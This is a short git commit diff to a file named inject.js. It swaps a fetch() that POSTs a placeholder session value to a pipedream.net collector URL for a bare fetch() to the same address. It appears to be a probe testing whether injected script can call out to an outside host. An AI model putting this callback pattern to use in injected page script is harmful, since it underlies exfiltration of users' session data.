2cf492a7932ce9cbdc16147b7430c8bb7dab7570
Sarem Seitz <sarem.seitz@gmail.com>
2024-08-29 21:38:40 +0200

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,7 +1,1 @@
-fetch('https://en1e81pb56qg5.x.pipedream.net', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ session: "TEST" })
-})
+fetch('https://en1e81pb56qg5.x.pipedream.net/')
